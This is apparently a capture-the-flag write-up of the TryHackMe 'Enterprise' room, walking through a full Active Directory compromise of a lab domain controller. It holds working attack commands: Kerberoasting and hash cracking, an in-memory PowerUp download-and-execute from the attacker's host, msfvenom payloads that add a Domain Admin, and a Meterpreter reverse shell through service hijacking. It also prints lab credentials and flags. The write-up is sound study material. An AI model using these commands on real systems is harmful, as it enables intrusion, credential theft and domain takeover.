# TryHackMe — Enterprise

**Room:** Enterprise | **Difficulty:** Hard | **OS:** Windows
**Tags:** `Active Directory` `Kerberoasting` `OSINT` `GitHub` `Unquoted Service Path` `BloodHound` `Service Hijacking`

---

## ![Room Banner](./assets/0.png)

---

## Overview

A black-box Active Directory engagement against a single Domain Controller. The attack chain spans OSINT, credential recovery from Git history, Kerberoasting, and local privilege escalation via an unquoted service path — culminating in full domain compromise. Rabbit holes are documented where they informed the methodology.

---

## Phase 1 — Reconnaissance

### Nmap Full-Port Scan

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ nmap -Pn -p- -A 10.112.151.187 -vv -oN nmap.txt
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|_  Product_Version: 10.0.17763
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
7990/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: Log in to continue - Log in with Atlassian account
9389/tcp  open  mc-nmf        .NET Message Framing

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

**Key takeaways:** The RDP NTLM banner leaks the full AD topology — machine `LAB-DC`, child domain `LAB.ENTERPRISE.THM`, forest root `ENTERPRISE.THM`. SMB signing is enforced, ruling out relay attacks. Port 7990 (Atlassian Bitbucket) is flagged as a high-priority target. WinRM is present on 5985.

```
10.112.151.187  LAB-DC.LAB.ENTERPRISE.THM  LAB.ENTERPRISE.THM  ENTERPRISE.THM
```

---

## Phase 2 — SMB & LDAP Enumeration

### Null Session Probe

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ enum4linux-ng 10.112.151.187 -A
```

```
[+] Appears to be root/parent DC
[+] Long domain name is: ENTERPRISE.THM
[+] SMB signing required: true
[+] Server allows authentication via username '' and password ''
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED
[-] Could not get groups: STATUS_ACCESS_DENIED
[+] Found 0 shares for user '' with password ''
```

Anonymous LDAP bind succeeds and reveals the forest/domain structure; deeper RPC calls are blocked.

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ ldapsearch -x -H ldap://10.112.151.187 -s base namingcontexts
```

```
namingcontexts: CN=Configuration,DC=ENTERPRISE,DC=THM
namingcontexts: CN=Schema,CN=Configuration,DC=ENTERPRISE,DC=THM
namingcontexts: DC=ForestDnsZones,DC=ENTERPRISE,DC=THM
namingcontexts: DC=LAB,DC=ENTERPRISE,DC=THM
namingcontexts: DC=DomainDnsZones,DC=LAB,DC=ENTERPRISE,DC=THM
```

### SMB Share Enumeration

CrackMapExec reported no shares via null session (it uses the SAMR/RPC path, which is blocked). Falling back to `smbclient`, which bypasses this restriction by using the SMB protocol directly:

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ crackmapexec smb 10.112.151.187 -u '' -p '' --shares
SMB  10.112.151.187  445  LAB-DC  [+] LAB.ENTERPRISE.THM\:
SMB  10.112.151.187  445  LAB-DC  [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ smbclient -L //10.112.151.187 -N

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    Docs            Disk
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share
    SYSVOL          Disk      Logon server share
    Users           Disk      Users Share. Do Not Touch!
```

---

## Phase 3 — Share Analysis

### Docs Share

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ smbclient //10.112.151.187/Docs -N
smb: \> ls
  RSA-Secured-Credentials.xlsx    A    15360
  RSA-Secured-Document-PII.docx   A    18432

smb: \> prompt off
smb: \> mget *
```

Both files are encrypted with modern Office encryption (PBKDF2-SHA256, 100,000 iterations). At ~10–20 guesses/second, a wordlist attack is not viable. Deprioritised.

### Users Share — PSReadLine History

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ smbclient //10.112.151.187/Users -N
smb: \> ls
  Administrator    D
  atlbitbucket     D
  bitbucket        D
  Default          D
  LAB-ADMIN        D
  Public           D
```

Windows persists PowerShell command history at `AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. Browsing `LAB-ADMIN`'s profile revealed:

```
echo "replication:101RepAdmin123!!" > private.txt
```

Credentials did not authenticate — rabbit hole. The share structure itself, however, yielded a useful username list: `Administrator`, `atlbitbucket`, `bitbucket`, `LAB-ADMIN`.

---

## Phase 4 — Username Enumeration & AS-REP Roasting

### Kerbrute

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ /opt/kerbrute userenum --dc 10.112.151.187 -d LAB.ENTERPRISE.THM /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

```
[+] VALID USERNAME: banana
[+] VALID USERNAME: guest
[+] VALID USERNAME: administrator
[+] VALID USERNAME: cake
[+] VALID USERNAME: enterprise
[+] VALID USERNAME: nik
[+] VALID USERNAME: spooks
[+] VALID USERNAME: joiner
```

### AS-REP Roasting

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ impacket-GetNPUsers LAB.ENTERPRISE.THM/ -dc-ip 10.112.151.187 -no-pass -usersfile users.txt
[-] User banana doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nik doesn't have UF_DONT_REQUIRE_PREAUTH set
# ... (same for all)
```

All accounts have Kerberos pre-authentication enabled. No AS-REP hashes obtainable. Pivoting to web services.

---

## Phase 5 — Web Enumeration & GitHub OSINT

### Port 80

No content of interest found via fuzzing or manual browsing.

### Port 7990 — Atlassian Bitbucket

The Bitbucket login page displayed a notice:

```
Reminder to all Enterprise-THM Employees:
We are moving to GitHub
```

This is an actionable OSINT lead. Searching GitHub for `Enterprise-THM` surfaced a live organisation.

## ![GitHub Organisation](./assets/1.png)

One contributor is listed as `Nik-enterprise-dev` — corroborating `nik` as a valid domain account confirmed by Kerbrute.

## ![GitHub Member](./assets/2.png)

Reviewing the organisation's repositories, an admin automation script was identified.

## ![Repository](./assets/3.png)

Inspecting the **commit history** of that script revealed credentials committed in plaintext in a prior revision before being scrubbed:

## ![Commit History](./assets/4.png)

```powershell
$userName = 'nik'
$userPassword = 'ToastyBoi!'
```

---

## Phase 6 — Credential Validation & Kerberoasting

### Validating `nik`

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ crackmapexec smb 10.112.151.187 -u 'nik' -p 'ToastyBoi!'
SMB  10.112.151.187  445  LAB-DC  [+] LAB.ENTERPRISE.THM\nik:ToastyBoi!
```

Valid — standard domain user, no local admin. WinRM access confirmed empty `Remote Management Users` group. Checking `Remote Desktop Users`:

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ crackmapexec smb 10.112.151.187 -u 'nik' -p 'ToastyBoi!' --groups 'Remote Desktop Users'
SMB  10.112.151.187  445  LAB-DC  LAB.ENTERPRISE.THM\bitbucket
```

`bitbucket` has RDP access — a concrete escalation target.

### Kerberoasting

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ impacket-GetUserSPNs -dc-ip 10.112.151.187 LAB.ENTERPRISE.THM/nik:ToastyBoi! -request
```

```
ServicePrincipalName  Name       MemberOf
--------------------  ---------  ------------------------------------------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,...

$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$28e7ff42f235...
```

`bitbucket` has a registered SPN (`HTTP/LAB-DC`) and is a member of `sensitive-account`. TGS ticket obtained for offline cracking.

### Cracking the TGS Hash

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ hashcat -m 13100 service.hash /usr/share/wordlists/rockyou.txt
```

Recovered password: `littleredbucket`

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ crackmapexec smb 10.112.151.187 -u 'bitbucket' -p 'littleredbucket'
SMB  10.112.151.187  445  LAB-DC  [+] LAB.ENTERPRISE.THM\bitbucket:littleredbucket
```

---

## Phase 7 — RDP Foothold & Flag 1

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ xfreerdp /v:10.112.151.187 /u:bitbucket /p:'littleredbucket' /d:LAB.ENTERPRISE.THM /cert:ignore /sec:nla
```

Interactive session established. Flag 1 recovered from the desktop.

**Flag 1:** `THM{ed882d02b34246536ef7da79062bef36}`

---

## Phase 8 — Domain Mapping with BloodHound

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ bloodhound-python -u bitbucket -p 'littleredbucket' -d LAB.ENTERPRISE.THM -ns 10.112.151.187 -c All

┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ sudo neo4j start

┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ /opt/BloodHound-linux-x64/BloodHound --no-sandbox
```

## ![BloodHound Graph](./assets/5.png)

BloodHound confirmed `bitbucket`'s `CanRDP` edge to `LAB-DC` and an active `Administrator` session on the DC. No exploitable ACL path existed through AD permissions alone. The attack surface shifted to the local host.

---

## Phase 9 — Local Privilege Escalation: Unquoted Service Path

### Loading PowerUp In-Memory

```bash
# On Kali — serve PowerUp
python3 -m http.server 80
```

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.129.39:80/PowerUp.ps1')
Invoke-AllChecks
```

PowerUp identified the `zerotieroneservice` as exploitable on two vectors simultaneously:

- **Unquoted Service Path:** Binary path `C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe` is unquoted and space-delimited. Windows path resolution will execute `C:\Program Files (x86)\Zero Tier\Zero.exe` if present.
- **Modifiable Service Binary:** `BUILTIN\Users` holds write permissions on the service executable directly.
- **StartName: LocalSystem** — execution context is `NT AUTHORITY\SYSTEM`.
- **CanRestart: True** — the service can be stopped and started without administrator rights, enabling immediate exploitation without requiring a reboot.

---

## Phase 10 — Service Hijack: Exploitation

### Method 1 — Persistent Domain Admin via Service Binary

Craft a service-format binary that executes domain account creation commands. Since the service runs as SYSTEM on a Domain Controller, `net user` and `net group` commands execute with full domain authority.

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ msfvenom -p windows/x64/exec CMD="cmd.exe /c net user hacker Password123! /add /domain && net group \"Domain Admins\" hacker /add /domain" -f exe-service -o Zero.exe
Payload size: 369 bytes
Final size of exe-service file: 12288 bytes
Saved as: Zero.exe

python3 -m http.server 80
```

```powershell
PS C:\Users\bitbucket> wget "192.168.129.39:80/Zero.exe" -OutFile "C:\Program Files (x86)\Zero Tier\Zero.exe"
Stop-Service zerotieroneservice
Start-Service zerotieroneservice
```

```powershell
PS C:\Users\bitbucket> net user hacker /domain

Local Group Memberships
Global Group memberships     *Domain Admins    *Domain Users
The command completed successfully.
```

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ crackmapexec smb 10.112.151.187 -u 'hacker' -p 'Password123!'
SMB  10.112.151.187  445  LAB-DC  [+] LAB.ENTERPRISE.THM\hacker:Password123! (Pwn3d!)
```

Domain compromised.

---

### Method 2 — Interactive SYSTEM Shell via Meterpreter

For an interactive session, a staged Meterpreter payload is dropped as the hijack binary.

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.129.39 LPORT=4444 EXITFUNC=thread -f exe -o 'ZeroTier One.exe'
Payload size: 511 bytes
Final size of exe file: 7680 bytes
```

`InitialAutoRunScript` is set to auto-migrate immediately on session open. This is critical: without process migration, the session dies when the service binary terminates after start.

```
msf > use multi/handler
msf exploit(multi/handler) > set lhost 192.168.129.39
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set InitialAutoRunScript post/windows/manage/migrate
msf exploit(multi/handler) > run
```

Service restart triggers execution, Meterpreter migrates to a stable process, yielding a persistent `NT AUTHORITY\SYSTEM` shell on the DC.

---

## Phase 11 — Final Flag

```bash
┌──(kali㉿kali)-[~/Writeups/Enterprise]
└─$ crackmapexec smb 10.112.151.187 -u 'hacker' -p 'Password123!' --get-file 'C:\Users\Administrator\Desktop\system.txt' system.txt
```

**Flag 2:** `THM{1a1fa94875421296331f145971ca4881}`

---

## Attack Chain Summary

| Phase           | Technique                            | Outcome                                      |
| --------------- | ------------------------------------ | -------------------------------------------- |
| Reconnaissance  | Nmap full-port scan                  | DC topology, domain structure, open services |
| SMB Enumeration | smbclient null session               | Accessible shares, username list             |
| OSINT           | GitHub organisation + commit history | Plaintext credentials for `nik`              |
| Kerberoasting   | GetUserSPNs + Hashcat                | Credentials for `bitbucket`                  |
| RDP Access      | xfreerdp                             | Interactive session, Flag 1                  |
| Domain Mapping  | BloodHound                           | No ACL path; pivoted to local PrivEsc        |
| PrivEsc         | Unquoted service path + CanRestart   | SYSTEM execution on DC                       |
| Persistence     | Service binary hijack                | New Domain Admin account, Flag 2             |

---

## Key Takeaways

The initial access vector here — credentials embedded in a Git commit history — is not a CTF-specific contrivance. It reflects a common real-world failure: secrets are removed from the current state of a repository but remain accessible in its history. The OSINT pivot from an internal Bitbucket notice to a GitHub organisation search is the kind of lateral thinking that separates methodical enumeration from checklist execution.

The privilege escalation chain illustrates how two compounding misconfigurations — an unquoted service path and `CanRestart` rights for unprivileged users — convert a theoretical finding into an immediate, reliable exploit without requiring any reboot dependency.

---

_Writeup repository: [https://github.com/MohamedTaherBorgi/Writeups](https://github.com/MohamedTaherBorgi/Writeups)_

**Tags:** `TryHackMe` `Active Directory` `Kerberoasting` `OSINT` `GitHub` `Unquoted Service Path` `PowerUp` `Meterpreter` `Service Hijacking` `BloodHound`
